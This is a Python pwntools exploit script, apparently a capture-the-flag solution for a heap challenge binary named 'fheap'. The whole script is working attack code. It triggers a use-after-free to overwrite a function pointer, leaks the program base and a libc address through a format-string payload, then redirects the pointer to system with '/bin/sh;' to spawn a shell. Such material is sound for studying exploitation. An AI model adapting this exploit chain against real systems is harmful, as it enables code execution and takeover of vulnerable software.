#!/usr/bin/python

from pwn import *
DEBUG = 1

if DEBUG:
	r = process('./fheap')
	elf = ELF('./fheap')
	libc = ELF("./libc-2.23.so")
else:
	r = remote('127.0.0.1',4444)

def create(size,content):
    r.recvuntil("3.quit")
    r.sendline("create ")
    r.recvuntil("Pls give string size:")
    r.sendline(str(size))
    r.recvuntil("str:")
    r.sendline(str(content))

def delete(idx):
    r.recvuntil("3.quit")
    r.sendline("delete ")
    r.recvuntil("id:")
    r.sendline(str(idx))
    r.recvuntil("Are you sure?:")
    r.sendline("yes")	

create(10,"aaa")
create(10,"bbb")


delete(1)
delete(0)

create(25,b'f'*24+p8(0xE4))

delete(1)
r.recvuntil(b"f"*24)
puts_addr = u64(r.recvline("\n")[:-1].ljust(8,"\x00"))

base_addr = puts_addr - 0xde4
success("base_addr :" + hex(base_addr))

r.sendlineafter("Are you sure?:","H4lo")

delete(0)

printf_plt = base_addr + elf.plt['printf']

payload = "%51$s^^".ljust(24,'A')
payload += p64(printf_plt)

create(32,payload)

delete(1)
addr = u64(r.recv(6).ljust(8,'\x00'))

success(hex(addr))

success("libc_addr :"+hex(addr+0xaf8-0x5d2000))
libc_addr = addr+0xaf8-0x5d2000        # 取到偏移

delete(0)

payload = "/bin/sh;".ljust(24,'A')
payload += p64(libc_addr + libc.symbols['system'])

create(32,payload)

r.interactive()